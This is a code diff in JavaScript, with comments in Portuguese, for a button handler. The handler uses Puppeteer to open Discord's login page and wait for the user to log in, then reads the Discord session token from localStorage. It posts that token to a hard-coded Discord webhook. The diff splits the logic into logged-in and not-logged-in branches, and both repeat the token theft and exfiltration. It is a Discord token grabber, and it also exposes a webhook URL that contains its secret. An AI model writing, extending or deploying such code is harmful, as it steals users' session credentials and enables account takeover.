@@ -16,39 +16,77 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('getTokenButton').addEventListener('click', async () => {
         const webhookUrl = 'https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk'; // Substitua pelo URL do seu webhook
 
+        const puppeteer = require('puppeteer');
         const browser = await puppeteer.launch({ headless: false });
         const page = await browser.newPage();
+
+        // Acessa a página do Discord
         await page.goto('https://discord.com/login');
 
-        // Aguarda o usuário fazer login
-        await page.waitForSelector('textarea[placeholder="Enter your message"]');
-
-        // Obtém o token do localStorage
-        const token = await page.evaluate(() => {
-            return localStorage.getItem('token');
+        // Verifica se o usuário já está logado
+        const isLoggedIn = await page.evaluate(() => {
+            return !!document.querySelector('textarea[placeholder="Enter your message"]');
         });
 
-        await browser.close();
+        if (isLoggedIn) {
+            // Obtém o token do localStorage
+            const token = await page.evaluate(() => {
+                return localStorage.getItem('token');
+            });
 
-        // Dados a serem enviados para o webhook
-        const data = {
-            content: `Token do Discord: ${token}`
-        };
+            await browser.close();
 
-        // Enviando a requisição POST para o webhook
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        });
+            // Dados a serem enviados para o webhook
+            const data = {
+                content: `Token do Discord: ${token}`
+            };
 
-        // Verificando a resposta
-        if (response.status === 204) {
-            alert('Token enviado com sucesso!');
+            // Enviando a requisição POST para o webhook
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            // Verificando a resposta
+            if (response.status === 204) {
+                alert('Token enviado com sucesso!');
+            } else {
+                alert(`Erro ao enviar o token: ${response.status}`);
+            }
         } else {
-            alert(`Erro ao enviar o token: ${response.status}`);
+            // Aguarda o usuário fazer login
+            await page.waitForSelector('textarea[placeholder="Enter your message"]');
+
+            // Obtém o token do localStorage
+            const token = await page.evaluate(() => {
+                return localStorage.getItem('token');
+            });
+
+            await browser.close();
+
+            // Dados a serem enviados para o webhook
+            const data = {
+                content: `Token do Discord: ${token}`
+            };
+
+            // Enviando a requisição POST para o webhook
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            // Verificando a resposta
+            if (response.status === 204) {
+                alert('Token enviado com sucesso!');
+            } else {
+                alert(`Erro ao enviar o token: ${response.status}`);
+            }
         }
     });
 });
